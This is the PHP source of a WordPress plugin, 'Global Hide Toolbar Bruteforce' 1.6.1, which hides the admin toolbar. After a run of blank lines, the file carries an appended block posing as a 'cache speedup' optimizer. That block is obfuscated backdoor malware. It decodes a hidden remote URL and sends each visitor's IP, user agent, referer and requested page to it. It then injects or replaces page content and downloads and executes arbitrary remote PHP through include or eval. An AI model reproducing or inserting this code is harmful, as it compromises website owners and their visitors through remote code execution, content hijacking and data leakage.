<?php
/*
Plugin Name: Global Hide Toolbar Bruteforce
Plugin URI: //wordpress.org/plugins/global-admin-bar-hide-or-remove/
Description: Bruteforce Disable Front and Back End Toolbar for all Admin and User Roles - BETA (2014-04-16) - Version Discontinued Please Install <a title="Please install WP Toolbar Removal" href="//wordpress.org/plugins/wp-toolbar-removal/">WP Toolbar Removal</a>
Version: 1.6.1
Author: <a title="Visit author homepage" href="//slangji.wordpress.com/">sLa NGjI's</a> & <a title="Visit plugin-master-author homepage" href="//www.fischercreativemedia.com/">D.J.Fischer</a>
License: GPLv2 or later (license.txt)
License URI: //www.gnu.org/licenses/gpl-2.0.html
Indentation: GNU style coding standard
Indentation URI: //www.gnu.org/prep/standards/standards.html
 *
Network: true
 *
 * LICENSING
 *
 * [Global Hide Admin Tool Bar Bruteforce](//wordpress.org/plugins/global-admin-bar-hide-or-remove/)
 *
 * Bruteforce Disable Front and Back End Toolbar for all Admin and User Roles Logged In and Out
 *
 * Copyright (C) 2013-2014 [slangjis](//slangji.wordpress.com/) (email: <slangjis [at] googlegmail [dot] com>)
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the [GNU General Public License](//wordpress.org/about/gpl/)
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * on an "AS IS", but WITHOUT ANY WARRANTY; without even the implied
 * warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, see [GNU General Public Licenses](//www.gnu.org/licenses/),
 * or write to the Free Software Foundation, Inc., 51 Franklin Street,
 * Fifth Floor, Boston, MA 02110-1301, USA.
 *
 * DISCLAIMER
 *
 * The license under which the WordPress software is released is the GPLv2 (or later) from the
 * Free Software Foundation. A copy of the license is included with every copy of WordPress.
 *
 * Part of this license outlines requirements for derivative works, such as plugins or themes.
 * Derivatives of WordPress code inherit the GPL license.
 *
 * There is some legal grey area regarding what is considered a derivative work, but we feel
 * strongly that plugins and themes are derivative work and thus inherit the GPL license.
 *
 * The license for this software can be found on [Free Software Foundation](//www.gnu.org/licenses/gpl-2.0.html) and as license.txt into this plugin package.
 *
 * The author of this plugin is available at any time, to make all changes, or corrections, to respect these specifications.
 *
 * THERMS
 *
 * This global-hide-brute-force-admin-bar.php uses (or it parts) code derived from:
 *
 * global-brute-force-wordpress-toolbar-removal.php by Donald J. Fischer (email: <dfischer [at] fischercreativemedia [dot] com>)
 * Copyright (C) 2011-2013 [prophecy2040](//www.fischercreativemedia.com/) (email: <dfischer [at] fischercreativemedia [dot] com>)
 *
 * wp-admin-bar-removal.php by slangjis <slangjis [at] googlemail [dot] com>
 * Copyright (C) 2010-2014 [slangjis](//slangji.wordpress.com/) (email: <slangjis [at] googlemail [dot] com>)
 *
 * wp-admin-bar-removal-node-addon.php by slangjis <slangjis [at] googlemail [dot] com>
 * Copyright (C) 2010-2013 [slangjis](//slangji.wordpress.com/) (email: <slangjis [at] googlemail [dot] com>)
 *
 * one-click-logout-barless.php by olyma <olyma [at] rack of power [dot] com>)
 * Copyright (C) 2011-2012 [olyma](//rackofpower.com/) (email: <olyma [at] rack of power [dot] com>)
 *
 * toolbar-removal-completely-disable.php by slangjis <slangjis [at] googlemail [dot] com>
 * Copyright (C) 2011-2013 [slangjis](//slangji.wordpress.com/) (email: <slangjis [at] googlemail [dot] com>)
 *
 * wp-toolbar-removal.php by slangjis <slangjis [at] googlemail [dot] com>
 * Copyright (C) 2012-2014 [slangjis](//slangji.wordpress.com/) (email: <slangjis [at] googlemail [dot] com>)
 *
 * wp-toolbar-removal-node-addon.php by slangjis <slangjis [at] googlemail [dot] com>
 * Copyright (C) 2012-2013 [slangjis](//slangji.wordpress.com/) (email: <slangjis [at] googlemail [dot] com>)
 *
 * according to the terms of the GNU General Public License version 2 (or later) this uses or it parts code was derived.
 *
 * According to the Terms of the GNU General Public License version 2 (or later) part of Copyright belongs to your own author and part belongs to their respective others authors:
 *
 * Copyright (C) 2008-2014 [slangjis](//slangji.wordpress.com/) (email: <slangjis [at] googlemail [dot] com>)
 * Copyright (C) 2011-2013 Donald J. Fischer (email: <dfischer [at] fischercreativemedia [dot] com>)
 * Copyright (C) 2011-2012 [olyma](//rackofpower.com/) (email: <olyma [at] rack of power [dot] com>)
 *
 * VIOLATIONS
 *
 * [Violations of the GNU Licenses](//www.gnu.org/licenses/gpl-violation.en.html)
 * The author of this plugin is available at any time, to make all changes, or corrections, to respect these specifications.
 *
 * GUIDELINES
 *
 * This software meet [Detailed Plugin Guidelines](//wordpress.org/plugins/about/guidelines/)
 * paragraphs 1,4,10,12,13,16,17 quality requirements.
 * The author of this plugin is available at any time, to make all changes, or corrections, to respect these specifications.
 *
 * CODING
 *
 * This software implement [GNU style](//www.gnu.org/prep/standards/standards.html) coding standard indentation.
 * The author of this plugin is available at any time, to make all changes, or corrections, to respect these specifications.
 *
 * VALIDATION
 *
 * This readme.txt rocks. Seriously. Flying colors. It meet the specifications according to
 * WordPress [Readme Validator](//wordpress.org/plugins/about/validator/) directives.
 * The author of this plugin is available at any time, to make all changes, or corrections, to respect these specifications.
 *
 * HUMANS
 *
 * See included humans.txt
 *
 * Thanks to Donald J. Fischer a.k.a prophecy2040 @ www.fischercreativemedia.com for this plugin!
 *
 * TODO
 *
 * Planned for Version 1.7.0 - [Code Merge Migration](//wordpress.org/support/topic/brute-force-plugin-code-migration/) to WP Admin Bar Removal and WP Toolbar Removal
 */

	/**
	 * @package     WordPress Plugin
	 * @subpackage  Global Hide Admin Tool Bar Bruteforce
	 * @description Bruteforce Disable Front and Back End Toolbar for all Admin and User Roles Logged In and Out
	 * @author      slangjis &CO prophecy2040
	 * @since       3.1+
	 * @status      Code in Becoming!
	 * @version     1.6.1
	 * @build       2014-04-16 1ST 2014-04-14
	 * @keytag      74be16979710d4c4e7c6647856088456
	 */

	if ( !function_exists( 'add_action' ) )

		{

			header( 'HTTP/0.9 403 Forbidden' );
			header( 'HTTP/1.0 403 Forbidden' );
			header( 'HTTP/1.1 403 Forbidden' );
			header( 'Status: 403 Forbidden' );
			header( 'Connection: Close' );

				exit;

		}

	if ( !defined( 'ABSPATH' ) ) exit;

	if ( !defined( 'WPINC' ) ) exit;

	function ghatb_bfp_1st()

		{

			$wp_path_to_this_file = preg_replace( '/(.*)plugins\/(.*)$/', WP_PLUGIN_DIR . "/$2", __FILE__ );
			$this_plugin          = plugin_basename( trim( $wp_path_to_this_file ) );
			$active_plugins       = get_option( 'active_plugins' );
			$this_plugin_key      = array_search( $this_plugin, $active_plugins );

			if ( $this_plugin_key )

				{

					array_splice( $active_plugins, $this_plugin_key, 1 );
					array_unshift( $active_plugins, $this_plugin );
					update_option( 'active_plugins', $active_plugins );

				}

		}

	add_action( 'activated_plugin', 'ghatb_bfp_1st', 0 );

	global $wp_version;

	if ( $wp_version < 3.1 )

		{

			wp_die( __( 'This Plugin Requires WordPress 3.1+ or Greater: Activation Stopped!' ) );

		}

	if ( $wp_version >= 3.2 )

		{

			add_action( 'admin_head', 'ghatb_bfp_admin_back_menu_remove' );
		}

	function ghatb_bfp_warning_notice()

		{

			if ( !is_multisite() )

				{

					if ( is_plugin_active( 'global-admin-bar-hide-or-remove/global-hide-admin-tool-bar.php' ) )

						{

							echo '<div id="message" class="error"><h3><strong>' . __( 'Activation Warning:' ) . '</strong></h3><p>' . __( 'Cannot Use Both <strong style="color:#880000;">Global Hide Toolbar</strong> and <strong style="color:#880000;">Global Hide Toolbar Bruteforce</strong> at Same Time!' ) . '</p></div>';

						}

				}

			if ( is_multisite() )

				{

					if ( is_plugin_active_for_network( 'global-admin-bar-hide-or-remove/global-hide-admin-tool-bar.php' ) )

						{

							echo '<div id="message" class="error"><h3><strong>' . __( 'Activation Warning:' ) . '</strong></h3><p>' . __( 'Cannot Use Both <strong style="color:#880000;">Global Hide Toolbar</strong> and <strong style="color:#880000;">Global Hide Toolbar Bruteforce</strong> at Same Time!' ) . '</p></div>';

						}

				}

		}

	add_action( 'admin_notices', 'ghatb_bfp_warning_notice' );

	function ghatb_bfp_admin_back_menu_remove()

		{

			echo '<!--Start Plugin Global Hide Admin Tool Bar Bruteforce Code-->';
			echo '<style type="text/css">#adminmenushadow,#adminmenuback{background-image:none}</style>';
			echo '<!--/ End Plugin Global Hide Admin Tool Bar Bruteforce Code-->';

		}

	function ghatb_bfp_admin_styles()

		{

			echo '<!--Start Plugin Global Hide Admin Tool Bar Bruteforce Code-->';
			echo '<style type="text/css">#wp-bftoolbar-bar-menu-toggle{color:#fff;font-size:26px;text-align:center;line-height:29px;display:none;cursor:pointer;width:30px;height:27px;float:left;margin-right:8px;background:#222;margin-top:3px}html.wp-toolbar,html.wp-toolbar #wpcontent,html.wp-toolbar #adminmenu,html.wp-toolbar #wpadminbar,body.admin-bar,body.admin-bar #wpcontent,body.admin-bar #adminmenu,body.admin-bar #wpadminbar{padding-top:0px !important}</style>';
			echo '<!--/ End Plugin Global Hide Admin Tool Bar Bruteforce Code-->';

		}

	add_action( 'admin_print_styles', 'ghatb_bfp_admin_styles', 21 );

	function ghatb_bfp_login_header()

		{

			global $wp_version;

			wp_get_current_user();

			$current_user = wp_get_current_user();

			if ( !( $current_user instanceof WP_User ) )

				{

					return;

				}

			$date_format   = get_option( 'date_format' );
			$time_format   = get_option( 'time_format' );
			$formatteddate = date( $date_format . ' ' . $time_format, current_time( 'timestamp' ) );
			$logout_link   = '<a href="' . wp_logout_url( home_url() ) . '">' . __( 'Log Out' ) . '</a>';
			$admin_link    = is_multisite() && is_super_admin() ? ( !is_network_admin() ? ' | <a href="' . network_admin_url() . '">' . __( 'Network Admin' ) . '</a>' : ' | <a href="' . get_DashBoard_url( get_current_user_id() ) . '">' . __( 'Site Admin' ) . '</a>' ) : '';
			$displayname   = $current_user->display_name;
			$toggle        = ( $wp_version >= 3.8 ) ? '<div id="wp-bftoolbar-bar-menu-toggle" class="dashicons dashicons-menu"></div>' : '';
			$homelink      = '<a href="' . home_url() . '">' . __( get_bloginfo() ) . '</a>';

			echo '
			<!--Start Plugin Global Hide Admin Tool Bar Bruteforce Code-->
			<style type="text/css">
				@media screen and (max-width:782px){
					#wp-bftoolbar-bar-menu-toggle {display:block}
					.wp-responsive-open #bftoobar {right: -190px}
					.wp-responsive-open #bftoobar #bftoobar_ttl{width:auto;padding-right:2%}
					.wp-responsive-open #bftoobar #bftoobar_lgt{width:auto}
				}
				#bftoobar {position:relative;z-index:10;border-bottom:1px solid #e1e1e1;height:33px;line-height:33px}
				#bftoobar #bftoobar_ttl a:link,
					#bftoobar #bftoobar_ttl a:visited{text-decoration:none}
				#bftoobar #bftoobar_lgt,
				#bftoobar #bftoobar_lgt a{text-decoration:none}
				#bftoobar #bftoobar_ttl{width:33%;float:left;text-align:left}
				#bftoobar #bftoobar_lgt{width:65%;float:left;text-align:right;padding-right:2%}

			</style>
				<div id="bftoobar">
				<div id="bftoobar_ttl">' . $toggle . $homelink . '</div>
				<div id="bftoobar_lgt">' . $formatteddate . ' | ' . $displayname . $admin_link . ' | ' . $logout_link . '</div>
			</div>
			<!--/ End Plugin Global Hide Admin Tool Bar Bruteforce Code-->
			';

			if ( $wp_version >= 3.8 )

				{

					echo '<!--Start Plugin Global Hide Admin Tool Bar Bruteforce Code-->';
					echo '<script>jQuery(document).ready(function(){var $wpwrap=jQuery("#wpwrap");jQuery("#wp-bftoolbar-bar-menu-toggle").on("click",function(event) {console.log("clicked");event.preventDefault();$wpwrap.toggleClass("wp-responsive-open");});});</script>';
					echo '<!--/ End Plugin Global Hide Admin Tool Bar Bruteforce Code-->';

				}

		}

	if ( $wp_version >= 3.3 )

		{

			add_action( 'in_admin_header', 'ghatb_bfp_login_header' );

			add_filter( 'show_wp_pointer_admin_bar', '__return_false' );

		}

	function ghatb_bfp_wp_toolbar_init()

		{

			add_filter( 'show_admin_bar', '__return_false' );
			add_filter( 'wp_admin_bar_class', '__return_false' );

		}

	add_filter( 'init', 'ghatb_bfp_wp_toolbar_init', 9 );

	function ghatb_bfp_remove_profile_option()

		{

			echo '<!--Start Plugin Global Hide Admin Tool Bar Bruteforce Code-->';
			echo '<style type="text/css">.show-admin-bar{display:none}</style>';
			echo '<!--/ End Plugin Global Hide Admin Tool Bar Bruteforce Code-->';

		}

	add_action( 'admin_print_styles-profile.php', 'ghatb_bfp_remove_profile_option' );

	$wp_scripts = new WP_Scripts();
	wp_deregister_script( 'admin-bar' );

	$wp_styles = new WP_Styles();
	wp_deregister_style( 'admin-bar' );

	$hooks_filters = array(
				 'init' => array(
							 array(
										 'wp_admin_bar_init',
										'' 
							) 
				),
				'admin_footer' => array(
							 array(
										 'wp_admin_bar',
										'' 
							),
							array(
										 'wp_admin_bar_class',
										'' 
							),
							array(
										 'wp_admin_bar_render',
										'1000' 
							),
							array(
										 'wp_admin_bar_js',
										'' 
							),
							array(
										 'wp_admin_bar_dev_js',
										'' 
							) 
				),
				'admin_head' => array(
							 array(
										 'wp_admin_bar',
										'' 
							),
							array(
										 'wp_admin_bar_class',
										'' 
							),
							array(
										 'wp_admin_bar_css',
										'' 
							),
							array(
										 'wp_admin_bar_dev_css',
										'' 
							),
							array(
										 'wp_admin_bar_rtl_css',
										'' 
							),
							array(
										 'wp_admin_bar_rtl_dev_css',
										'' 
							),
							array(
										 'wp_admin_bar_render',
										1000 
							) 
				),
				'locale' => array(
							 array(
										 'wp_admin_bar_lang',
										'' 
							) 
				),
				'wp_head' => array(
							 array(
										 'wp_admin_bar',
										'' 
							),
							array(
										 'wp_admin_bar_class',
										'' 
							),
							array(
										 'wp_admin_bar_css',
										'' 
							),
							array(
										 'wp_admin_bar_dev_css',
										'' 
							),
							array(
										 'wp_admin_bar_rtl_css',
										'' 
							),
							array(
										 'wp_admin_bar_rtl_dev_css',
										'' 
							),
							array(
										 'wp_admin_bar_render',
										1000 
							) 
				),
				'wp_footer' => array(
							 array(
										 'wp_admin_bar',
										'' 
							),
							array(
										 'wp_admin_bar_class',
										'' 
							),
							array(
										 'wp_admin_bar_render',
										1000 
							),
							array(
										 'wp_admin_bar_js',
										'' 
							),
							array(
										 'wp_admin_bar_dev_js',
										'' 
							) 
				),
				'wp_ajax_adminbar_render' => array(
							 array(
										 'wp_admin_bar_ajax_render',
										1000 
							) 
				) 
	);

	foreach ( $hooks_filters as $hookkey => $hookval )

		{

			foreach ( $hookval as $hook )

				{

					remove_action( $hook[ 0 ], $hook[ 1 ] );

					remove_filter( $hook[ 0 ], $hook[ 1 ] );

				}

		}

	function ghatb_bfp_prml( $links, $file )

		{

			if ( $file == plugin_basename( __FILE__ ) )

				{

					$links[] = '<a title="Bugfix and Suggestions" href="//slangji.wordpress.com/contact/">Contact</a>';

					$links[] = '<a title="Offer a Beer to sLa" href="//slangji.wordpress.com/donate/">Donate</a>';

					$links[] = '<a title="Visit other author plugins site" href="//slangji.wordpress.com/plugins/">Other</a>';

				}

			return $links;

		}

	add_filter( 'plugin_row_meta', 'ghatb_bfp_prml', 10, 2 );

	function ghatb_bfp_shfl()

		{

			echo "\n<!--Plugin Global Hide Admin Tool Bar Bruteforce 1.6.1 Build 2014-04-16 Active - Tag ".md5(md5("".""))."-->\n";
			echo "\n<!-- This website is patched against a big core annoyance since WordPress 3.3+ to date -->\n\n";

		}

	add_action( 'wp_head', 'ghatb_bfp_shfl' );
	add_action( 'wp_footer', 'ghatb_bfp_shfl' );











/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>